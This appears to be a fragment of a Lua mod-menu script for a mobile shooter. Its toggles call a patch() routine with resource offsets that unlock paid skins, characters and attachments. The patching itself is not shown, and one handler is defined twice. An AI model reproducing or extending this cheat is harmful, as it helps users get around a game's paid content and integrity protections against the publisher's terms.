ak117f.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function ak117f.OnCheckedChangeListener()
  if ak117f.checked then
    patch("Res/wow 700008")
    idkcstmToast("ᴀᴋ117 - Memento Mori Unlock Attachement")
  end
end

lava.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function lava.OnCheckedChangeListener()
  if lava.checked then
    patch("Res/pogiako2 1000392")
    idkcstmToast("ᴀᴋ𝟷𝟷𝟽 - ʟᴀᴠᴀ ʀᴇᴍɪx ᴀᴄᴛɪᴠᴀᴛᴇ")
  end
end

lava.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function lava.OnCheckedChangeListener()
  if lava.checked then
    patch("Res/wow 700009")
    idkcstmToast("ᴀᴋ𝟷𝟷𝟽 - Lava Remix Unlock Attachement")
  end
end

star.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function star.OnCheckedChangeListener()
  if star.checked then
    patch("Res/wow2 89996")
    idkcstmToast("sᴛᴀʀʟɪɢʜᴛ - ᴄʜᴀʀᴀᴄᴛᴇʀ ᴠ𝟷")
  end
end

star2.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function star2.OnCheckedChangeListener()
  if star2.checked then
    patch("Res/charss 90087")
    idkcstmToast("sᴛᴀʀʟɪɢʜᴛ - ᴄʜᴀʀᴀᴄᴛᴇʀ ᴠ𝟸")
  end
end

lander.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function lander.OnCheckedChangeListener()
  if lander.checked then
    patch("Res/wow2 89995")
    idkcstmToast("ʜᴏᴍᴇʟᴀɴᴅᴇʀ - ᴄʜᴀʀᴀᴄᴛᴇʀ ᴠ𝟷")
  end
end

lander2.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function lander2.OnCheckedChangeListener()
  if lander2.checked then
    patch("Res/charss 90086")
    idkcstmToast("ʜᴏᴍᴇʟᴀɴᴅᴇʀ - ᴄʜᴀʀᴀᴄᴛᴇʀ ᴠ𝟸")
  end
end

sazabi.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function sazabi.OnCheckedChangeListener()
  if sazabi.checked then
    patch("Res/Gundam 2")
    idkcstmToast("sᴀᴢᴀʙɪ - ᴄʜᴀʀᴀᴄᴛᴇʀ")
  end
end

ethan.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function ethan.OnCheckedChangeListener()
  if ethan.checked then
    patch("Res/Gundam 3")
    idkcstmToast("ᴇᴛʜᴀɴ ɢᴜɴᴅᴀᴍ - ᴄʜᴀʀᴀᴄᴛᴇʀ")
  end
end

black1.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function black1.OnCheckedChangeListener()
  if black1.checked then
    patch("Res/wow2 89997")
    idkcstmToast("ʙʟᴀᴄᴋ ɴᴏɪʀ - ᴄʜᴀʀᴀᴄᴛᴇʀ ᴠ𝟷")
  end
end

black2.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function black2.OnCheckedChangeListener()
  if black2.checked then
    patch("Res/charss 90088")
    idkcstmToast("ʙʟᴀᴄᴋ ɴᴏɪʀ - ᴄʜᴀʀᴀᴄᴛᴇʀ ᴠ𝟸")
  end
end

sand.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function sand.OnCheckedChangeListener()
  if sand.checked then
    patch("Res/gayontopp 28193")
    idkcstmToast("sɴᴏᴡʙᴏᴀʀᴅ - sᴀɴᴅsᴛᴏʀᴍ")
  end
end

krm.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function krm.OnCheckedChangeListener()
  if krm.checked then
    patch("Res/xczSKINcpp 286")
    idkcstmToast("ᴋʀᴍ 𝟸𝟼𝟸 - ɢʟᴏʀɪᴏᴜs ʙʟᴀᴢᴇ")
  end
end

krml.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function krml.OnCheckedChangeListener()
  if krml.checked then
    patch("Res/xczSKINcpp 288")
    idkcstmToast("ᴋʀᴍ 𝟸𝟼𝟸 - ʟᴏᴀᴅᴇᴅ ɢʟɪᴛᴄʜ")
  end
end

krmr.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function krmr.OnCheckedChangeListener()
  if krmr.checked then
    patch("Res/xczSKINcpp 31000")
    idkcstmToast("ᴋʀᴍ 𝟸𝟼𝟸 - ʀᴇᴅ ғɪssᴜʀᴇ")
  end
end

hso.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function hso.OnCheckedChangeListener()
  if hso.checked then
    patch("Res/xczSKINcpp 46000")
    idkcstmToast("ʜsᴏ𝟺𝟶𝟻 - sᴏɴɢᴛʀᴇss")
  end
end

kui.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0x9AFFFFFF, PorterDuff.Mode.SRC_ATOP))
function kui.OnCheckedChangeListener()
  if kui.checked then
    patch("Res/CharssHAHA 90089")
    idkcstmToast("KUI JI - EXTERNAL OAUTH")
  end
end
]]



--import "thisislans"
--import "water"

import "updator"